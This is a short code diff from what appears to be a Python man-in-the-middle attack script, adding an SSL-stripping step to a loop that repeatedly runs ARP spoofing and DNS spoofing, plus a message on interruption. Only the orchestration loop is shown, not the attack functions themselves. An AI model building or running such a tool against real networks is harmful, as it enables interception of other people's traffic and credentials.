@@ -132,10 +132,12 @@ def attack():
         while True:
             ARP_spoofing()
             dns_spoof_attack()
+            ssl_strip_attack()
             time.sleep(20)
             print "Starting attack again"
 
     except KeyboardInterrupt:
+        print "KeyboardInterrupt, stopping the whole attack"
         pass
 
 if __name__ == "__main__":
